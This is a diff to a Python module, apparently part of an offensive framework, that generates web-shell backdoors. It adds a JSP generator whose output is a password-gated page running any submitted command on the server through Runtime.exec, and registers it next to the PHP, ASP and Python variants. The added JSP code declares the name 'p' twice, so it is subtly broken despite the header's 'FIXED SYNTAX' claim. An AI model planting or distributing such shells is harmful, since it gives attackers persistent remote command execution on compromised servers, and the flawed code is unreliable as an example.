@@ -1,5 +1,5 @@
 """
-Simple Web Shell Backdoor
+Simple Web Shell Backdoor - FIXED SYNTAX
 """
 
 MODULE_INFO = {
@@ -9,7 +9,7 @@ MODULE_INFO = {
 OPTIONS = {
     "type": {
         "type": "choice",
-        "description": "Web shell Backdoor",
+        "description": "Web shell type",
         "required": True,
         "choices": ["php", "asp", "jsp", "python"],
         "default": "php"
@@ -142,6 +142,40 @@ Command: <input type="text" name="cmd" size="50"><br>
 ''')
 '''
 
+def generate_jsp_shell(password):
+    """Generate JSP web shell"""
+    return f'''<%@ page import="java.util.*,java.io.*" %>
+<%
+// JSP Web Shell - For authorized testing only
+String pass = "{password}";
+String p = request.getParameter("p");
+
+if (pass.equals(p)) {{
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {{
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String s;
+        out.print("<pre>");
+        while ((s = stdInput.readLine()) != null) {{
+            out.println(s);
+        }}
+        out.print("</pre>");
+    }}
+}}
+%>
+
+<html>
+<body>
+<form method="post">
+Password: <input type="password" name="p">
+Command: <input type="text" name="cmd">
+<input type="submit" value="Execute">
+</form>
+</body>
+</html>
+'''
+
 def run(session, options):
     shell_type = options.get("type", "php")
     output_file = options.get("output", "shell.php")
@@ -161,6 +195,8 @@ def run(session, options):
         content = generate_php_shell(password)
     elif shell_type == "asp":
         content = generate_asp_shell(password)
+    elif shell_type == "jsp":
+        content = generate_jsp_shell(password)
     elif shell_type == "python":
         content = generate_python_shell()
     else:
